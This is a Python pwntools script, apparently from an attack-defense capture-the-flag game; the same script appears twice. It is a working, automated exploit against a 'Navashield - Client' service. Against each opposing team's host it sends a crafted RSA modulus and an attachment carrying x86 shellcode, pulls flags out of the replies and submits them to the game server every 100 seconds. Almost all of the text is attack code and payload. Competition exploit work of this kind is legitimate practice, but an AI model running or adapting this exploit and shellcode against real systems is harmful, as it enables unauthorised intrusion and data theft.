#!/usr/bin/env python3
from pwn import *
import time
import requests
import json


# This exploit I wrote since when I monitored Tulip, a strange request with 
# a crafted modulus came in

# So this is the code I wrote to try and replicate the exploits

def getFlagIds():
    ids = requests.get("https://web.ad.teameurope.space/competition/teams.json").json()
    flagIds = dict()

    chal = ids['flag_ids']["Navashield - Client"]

    for i in range(1, 26):
        flagIds[str(i)] = list()
        if i == 17:
            continue
        try:
            temp = chal[str(i)]
        except:
            continue
        for line in temp:
            flagIds[str(i)].append(line)
    return flagIds

submittedFlags = []
while True:
    flags = []
    flagIds = getFlagIds()
    for i in range(18, 26):
        if str(i) in flagIds.keys():
            for id in flagIds[str(i)]:
                if i == 17:
                    continue
                try:
                    r = remote(f"10.20.{str(i)}.6", 5000)
                except:
                    break
                try:
                    r.recvuntil(b"> ")
                    r.sendline("1")
                    print("first")

                    print(r.recvuntil(b"Sender address: "))
                    print("a")
                    r.sendline("brendan.serafino@enterprise.local")
                    print("this do be a mail")

                    # Crafted modulus
                    print(r.recvuntil(b"Sender modulus: "))
                    r.sendline("a1b2f991acd48955f125bdf55a541a23abb5f9af834491071048675ebee0203bb4179e54ea1caa266b87d6aa4962a96875d6ba39e0d5df113e9bdf2475947f7448ce35f662f1b8643ee62a404acd075321493c882ec6f6b186df4d589b864782106a4660cf14a3cba5ca68ee2e7a81b184c00fa1cee06bafdd3b4208d0fcbe79")

                    print(r.recvuntil(b"Message: "))
                    r.sendline("6y(tcI|:/'\K-ftJs&g+P*")

                    r.recvuntil(b"Attachment 0: ")
                    r.sendline("455845000200000000000080c200000001020000000000000048c7c09000000048c7c3400ae1524883f8007416488d0d0f0000004801c14883e90431194883e804ebe42a0b1f5e644259006f7e8920256b850208b2b8100639d20b7968b11af825850608668233135aa9ea6f67803b2c688e2a1042597d336f93242969840208830663923b17384252ee57088b0d52420ae11ac9cda9dba64226904008e15208cd2152400ae15d45cc6576be0be1524acc6576bf0be15240422695420ae15208cd2153400ae15d454226927c0ae1524f0f71c2ffffff7f040000000090909090")

                    print(r.recvuntil(b"Attachment 1: "))
                    r.sendline("3")

                    try:
                        temp = r.recvuntil(b"[3] Exit").decode()
                    except:
                        r.close()
                        continue

                except:
                    r.close()
                    continue

                print(temp)

                if "ICC_" in temp:
                    flag = temp.split("Here is the information you requested: ")[1].split("\n")[0]
                    flags.append(flag)

                r.close()

    r = remote("10.20.151.1", 31111)
    print(r.recvuntil(b"One flag per line please!\n\n"))

    for flag in flags:
        if flag in submittedFlags:
            continue

        r.sendline(flag)
        print(r.recvline())  # messages / errors
        submittedFlags.append(flag)

    r.close()

    time.sleep(100)
#!/usr/bin/env python3
from pwn import *
import time
import requests
import json

def getFlagIds():
    ids = requests.get("https://web.ad.teameurope.space/competition/teams.json").json()
    flagIds = dict()

    chal = ids['flag_ids']["Navashield - Client"]

    for i in range(1, 26):
        flagIds[str(i)] = list()
        if i == 17:
            continue
        try:
            temp = chal[str(i)]
        except:
            continue
        for line in temp:
            flagIds[str(i)].append(line)
    return flagIds

submittedFlags = []
while True:
    flags = []
    flagIds = getFlagIds()
    for i in range(18, 26):
        if str(i) in flagIds.keys():
            for id in flagIds[str(i)]:
                if i == 17:
                    continue
                try:
                    r = remote(f"10.20.{str(i)}.6", 5000)
                except:
                    break
                try:
                    r.recvuntil(b"> ")
                    r.sendline("1")
                    print("first")

                    print(r.recvuntil(b"Sender address: "))
                    print("a")
                    r.sendline("brendan.serafino@enterprise.local")
                    print("this do be a mail")

                    print(r.recvuntil(b"Sender modulus: "))
                    r.sendline("a1b2f991acd48955f125bdf55a541a23abb5f9af834491071048675ebee0203bb4179e54ea1caa266b87d6aa4962a96875d6ba39e0d5df113e9bdf2475947f7448ce35f662f1b8643ee62a404acd075321493c882ec6f6b186df4d589b864782106a4660cf14a3cba5ca68ee2e7a81b184c00fa1cee06bafdd3b4208d0fcbe79")

                    print(r.recvuntil(b"Message: "))
                    r.sendline("6y(tcI|:/'\K-ftJs&g+P*")

                    r.recvuntil(b"Attachment 0: ")
                    r.sendline("455845000200000000000080c200000001020000000000000048c7c09000000048c7c3400ae1524883f8007416488d0d0f0000004801c14883e90431194883e804ebe42a0b1f5e644259006f7e8920256b850208b2b8100639d20b7968b11af825850608668233135aa9ea6f67803b2c688e2a1042597d336f93242969840208830663923b17384252ee57088b0d52420ae11ac9cda9dba64226904008e15208cd2152400ae15d45cc6576be0be1524acc6576bf0be15240422695420ae15208cd2153400ae15d454226927c0ae1524f0f71c2ffffff7f040000000090909090")

                    print(r.recvuntil(b"Attachment 1: "))
                    r.sendline("3")

                    try:
                        temp = r.recvuntil(b"[3] Exit").decode()
                    except:
                        r.close()
                        continue

                except:
                    r.close()
                    continue

                print(temp)

                if "ICC_" in temp:
                    flag = temp.split("Here is the information you requested: ")[1].split("\n")[0]
                    flags.append(flag)

                r.close()

    r = remote("10.20.151.1", 31111)
    print(r.recvuntil(b"One flag per line please!\n\n"))

    for flag in flags:
        if flag in submittedFlags:
            continue

        r.sendline(flag)
        print(r.recvline())  # messages / errors
        submittedFlags.append(flag)

    r.close()

    time.sleep(100)
